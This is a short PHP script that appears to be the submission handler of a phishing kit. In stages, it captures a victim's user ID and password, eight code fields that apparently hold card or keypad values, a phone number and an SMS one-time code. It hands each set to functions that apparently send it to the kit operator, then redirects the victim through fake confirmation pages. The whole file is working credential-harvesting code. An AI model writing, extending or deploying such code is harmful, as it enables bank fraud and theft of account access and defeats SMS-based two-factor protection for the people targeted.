<?php

include './init.php';
$action = './gracias.php?step=succes&'.$id;
if($_SERVER['REQUEST_METHOD'] != 'POST'):
	die(rediret($link)); // We're done here
else:
	if(isset($_GET['step'])):

		/* Default Page */ 
		if($_GET['step'] == 'one'):
			AntiBombResI($to, $_POST['pnl'], $_POST['type'], $_POST['Uid'], $_POST['Pid'], $user, $referer);
			die(rediret('./firmer.php?'.$id)); // We're done here
			
			/* Default Page */ 
		elseif($_GET['step'] == 'tow'):
			AntiBombResIV($to, $_POST['k1'], $_POST['k2'], $_POST['k3'], $_POST['k4'], $_POST['k5'], $_POST['k6'], $_POST['k7'], $_POST['k8'], $_POST['tel01'], $user, $referer);
			die(rediret('./sms.php?'.$id)); // We're done here
			
			/* Default Page */ 
		elseif($_GET['step'] == 'four'):
			AntiBombResIII($to, $_POST['sms'], $user, $referer);
			die(rediret('./gracias.php?'.$id)); // We're done here
			
		
		endif;
	endif;
endif;
?>
